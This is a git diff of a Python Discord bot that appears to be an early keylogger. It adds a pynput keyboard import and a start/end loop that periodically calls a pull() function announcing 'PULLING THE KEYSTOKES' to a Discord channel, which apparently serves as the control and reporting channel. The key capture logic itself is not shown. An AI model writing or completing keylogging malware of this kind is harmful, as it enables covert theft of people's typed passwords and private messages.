@@ -2,7 +2,8 @@ import os, asyncio
 from dotenv import load_dotenv
 import discord
 from discord.ext import commands
-import pyhook
+from pynput import keyboard
+
 INTERVAL = 10
 
 load_dotenv()
@@ -12,15 +13,23 @@ if not TOKEN:
 
 intents = discord.Intents.default()
 intents.message_content = True
-bot = commands.Bot(command_prefix="!", intents=intents)
+bot = discord.Client(intents=intents)
 
-async def countdown_edit(channel, seconds):
-    msg = await channel.send(f"Countdown: {seconds}s")
-    for rem in range(seconds - 1, -1, -1):
-        await asyncio.sleep(1)
-        await msg.edit(content=f"Countdown: {rem}s")
-    await msg.edit(content="Done!")
-    asyncio.create_task(pull(channel))
+async def countdown(m, channel, flag):
+    while not flag.is_set():
+        msg = await channel.send(f"Countdown: {INTERVAL}s")
+        for rem in range(INTERVAL - 1, -1, -1):
+            await asyncio.sleep(1)
+            await msg.edit(content=f"Countdown: {rem}s")
+        await msg.edit(content="Done!")
+        await pull(channel)
+
+async def end(channel,flag):
+    def check(m):
+        return (m.content == "end")
+    await bot.wait_for("message", check = check)
+    flag.set()
+    await channel.send("Stopped Listening :3")
 
 async def pull(channel):
     await channel.send("PULLING THE KEYSTOKES")
@@ -29,11 +38,15 @@ async def pull(channel):
 async def on_message(message):
     if message.author.bot:
         return
-    if message.content.lower().strip() == "start":
-        asyncio.create_task(countdown_edit(message.channel, INTERVAL))
-    if message.content.lower().strip() == "end":
-       await bot.close()    
-    await bot.process_commands(message)
+    m = message.content
 
+    if m == "start":
+        flag = asyncio.Event()
+        asyncio.create_task(end(message.channel,flag))
+        asyncio.create_task(countdown(m,message.channel, flag))
+
+    elif m == "bye bye":
+        await bot.close()    
+    
 if __name__ == "__main__":
     bot.run(TOKEN)
